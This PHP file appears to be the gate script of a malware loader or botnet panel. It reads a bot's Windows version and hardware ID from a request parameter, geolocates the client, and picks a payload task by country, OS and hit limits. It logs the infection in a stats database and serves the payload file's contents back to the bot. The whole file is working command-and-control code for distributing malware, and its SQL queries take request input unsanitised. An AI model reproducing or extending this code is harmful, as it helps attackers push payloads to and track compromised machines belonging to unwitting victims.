<?php

include("config.php");
include("area.php");
include_once("geo_ip.php");


function in_arrayU($str, $array){
	if(in_array("ALL", $array)){
		return true;
	}
	elseif(in_array($str, $array)){
		return true;
	}
	else{
		return false;
	}
}

function c_windows($c){
	switch($c){
		case 'A':
		return 'Win10';
		break;
		case 'B':
		return 'Win81';
		break;
		case 'C':
		return 'Win8';
		break;
		case 'D':
		return 'Win7';
		break;
		default:
		return '?';
		break;
	}
}

// check the key..
if(!isset($_GET['v'])){
	die();
}
if(isset($_GET['v']) && strlen($_GET['v']) < 7){
	die();
}

$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d');
$geoip = geo_ip::getInstance("geo_ip.dat");
$country = $geoip->lookupCountryCode($ip);
$area = continent($country);
$windows = c_windows(substr($_GET['v'], 0, 1));
$hwid = substr($_GET['v'], 1, 7);
$sql_task = mysqli_query($conn, "SELECT id,name,priority,file,countries,windows,hits,max FROM tasks ORDER BY priority");
while($re = mysqli_fetch_assoc($sql_task)){
	$tid = $re['id'];
	$tname = $re['name'];
	$thits = $re['hits'];
	$fid = $re['file'];
	$country_array = explode(",", $re['countries']);
	$windows_array = explode(",", $re['windows']);
	if($re['hits'] < $re['max'] && in_arrayU($country, $country_array) && in_arrayU($windows, $windows_array)){
		$nhits = $thits + 1;
		$sql_file = mysqli_query($conn, "SELECT id,name,sha256,hits FROM files WHERE id='$fid'");
		$ref = mysqli_fetch_assoc($sql_file);
		$fsha = $ref['sha256'];
		$fname = $ref['name'];
		$nfhits = $ref['hits'] + 1;
	    $file = $upload.$fname;
		$check_stats = mysqli_query($conn, "SELECT firstdate, task, file FROM stats WHERE hwid='$hwid'");
		if(mysqli_num_rows($check_stats) > 0){
			$firstdate_row = mysqli_fetch_array($check_stats);
            $firstdate = $firstdate_row[0];
			$current_task = $firstdate_row[1];
			$current_file = $firstdate_row[2];
			mysqli_query($conn, "UPDATE stats SET ip='$ip', task='$tname', file='$fname', area='$area', country='$country', windows='$windows', firstdate='$firstdate', lastdate='$date' WHERE hwid='$hwid'");
			if($tname != $current_task){
				mysqli_query($conn, "UPDATE tasks SET hits='$nhits' WHERE id='$tid'");
			}
			if($fname != $current_file){
				mysqli_query($conn, "UPDATE files SET hits='$nfhits' WHERE id='$fid'");
			}
		}
		else{
			$firstdate = $date;
		    mysqli_query($conn, "INSERT INTO stats (hwid, ip, task, file, area, country, windows, firstdate, lastdate) VALUES ('$hwid', '$ip', '$tname', '$fname', '$area', '$country', '$windows', '$firstdate', '$date')");
		    mysqli_query($conn, "UPDATE tasks SET hits='$nhits' WHERE id='$tid'");
			mysqli_query($conn, "UPDATE files SET hits='$nfhits' WHERE id='$fid'");
		}
		echo file_get_contents($file);
		die();
	}
}


?>